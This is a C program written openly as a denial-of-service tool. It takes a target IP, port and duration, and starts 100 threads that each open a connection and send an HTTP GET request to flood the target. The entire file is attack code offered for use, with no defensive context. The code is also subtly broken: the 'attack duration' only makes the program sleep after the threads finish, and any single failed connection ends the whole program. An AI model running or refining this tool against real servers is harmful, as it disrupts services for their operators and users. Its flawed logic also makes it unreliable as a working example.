#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

// Define the usage string
#define USAGE "Usage: %s <target_ip> <target_port> <attack_duration>\n"

// Define the target IP address
char *target_ip = NULL;

// Define the target port
int target_port = 0;

// Define the attack duration in seconds
int attack_duration = 0;

// Create a function to send a single HTTP GET request
void attack() {
    // Create a socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    // Connect to the target
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    target_addr.sin_port = htons(target_port);
    if (connect(sock, (struct sockaddr *) &target_addr, sizeof(target_addr)) == -1) {
        perror("connect");
        exit(1);
    }

    // Send an HTTP GET request
    char *request = "GET / HTTP/1.1\r\n\r\n";
    if (send(sock, request, strlen(request), 0) == -1) {
        perror("send");
        exit(1);
    }

    // Close the socket
    close(sock);
}

// Create a thread pool to send multiple HTTP GET requests
int main(int argc, char **argv) {
    // Check if the user has provided the correct number of arguments
    if (argc != 4) {
        fprintf(stderr, USAGE, argv[0]);
        return 1;
    }

    // Get the target IP address, port, and attack duration from the command line arguments
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);

    // Create a thread pool
    pthread_t threads[100];
    for (int i = 0; i < 100; i++) {
        pthread_create(&threads[i], NULL, (void *) attack, NULL);
    }

    // Join the threads
    for (int i = 0; i < 100; i++) {
        pthread_join(threads[i], NULL);
    }

    // Sleep for the specified attack duration
    sleep(attack_duration);

    return 0;
}